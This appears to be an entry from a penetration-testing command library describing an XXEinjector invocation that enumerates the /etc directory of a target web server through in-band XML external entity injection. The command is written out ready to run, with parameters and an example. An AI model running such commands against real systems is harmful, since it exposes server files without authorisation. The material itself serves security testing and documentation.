---
id: 8a88b8ed-0798-4360-963f-5725cbd22dbb
name: xxeinjector-direct-enumeration
type: command
executor: bash
data: ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=$__MARKER
output: null
created_at: '2023-04-06T03:56:43.973536+00:00'
updated_at: '2023-04-10T20:24:45.357412+00:00'
platforms:
  - Web
  - Linux
tags:
  - xxe
  - direct
  - in-band
verified: true
validated: true
---

# xxeinjector-direct-enumeration

## Command

```bash
ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=$__MARKER
```

## Description

Performs direct in-band XXE enumeration using a unique marker for content extraction.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --file=/tmp/req.txt | Request file | Yes |
| --path=/etc | Enumeration path | Yes |
| --direct=$__MARKER | Unique marker string | Yes |

## Examples

### Basic Usage

```bash
ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK
```

## Expected Output

Response containing marker + file contents.

## Related

- [[procedures/Exploit-XXE-Vulnerability-Using-Multiple-Tools]]
- [[tools/XXEinjector]]
